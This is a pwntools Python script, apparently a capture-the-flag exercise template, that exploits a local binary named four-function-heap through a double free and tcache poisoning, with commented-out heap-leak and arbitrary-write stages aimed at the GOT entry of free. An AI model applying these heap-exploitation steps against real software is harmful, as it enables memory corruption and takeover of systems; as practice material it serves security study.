from pwn import *

e = ELF("./four-function-heap")
libc = e.libc


if args.GDB:
    p = gdb.debug(e.path)
else:
    p = process(e.path)

def alloc(idx, size, data="AAAA"):
  p.sendline("1")
  p.sendlineafter(":", str(idx))
  p.sendlineafter(":", str(size))
  p.sendlineafter(":", data)

  p.recvuntil(":")

def free(idx):
  p.sendline("2")
  p.sendlineafter(":", str(idx))

  p.recvuntil(":")

def show(idx):
  p.sendline("3")
  p.sendlineafter(": ", str(idx))

p.recvuntil(":")

log.info("free(got): %s" % hex(e.got.free))

# Your Code Here

log.info("--- test bed ---")
alloc(0,200,"")
alloc(0,20,"")
free(0)
free(0)
alloc(0,200,"EEEEEEEE")
free(0)
free(0)
alloc(0,200,p64(0x555555757260))
alloc(0,200,p64(0x555555757260))
show(0)


#log.info("--- Heap leak ---")
#alloc(0,60,"")
#free(0)
#free(0)
#show(0)
#leak =  p.recvline().strip()
#l_heap = u64(leak.ljust(8,"\0"))
#log.info("heap at %s" % hex(l_heap))
#log.info("offset to free: %s" % hex(l_heap + e.got.free))

#log.info("--- arbitrary write ---")
#alloc(0,60, p64(l_heap - 608))
#alloc(0,60,"")
#alloc(0,60,p64(0x0) + p64(0x0000000000000251) + "A"*(60-32))

p.interactive()
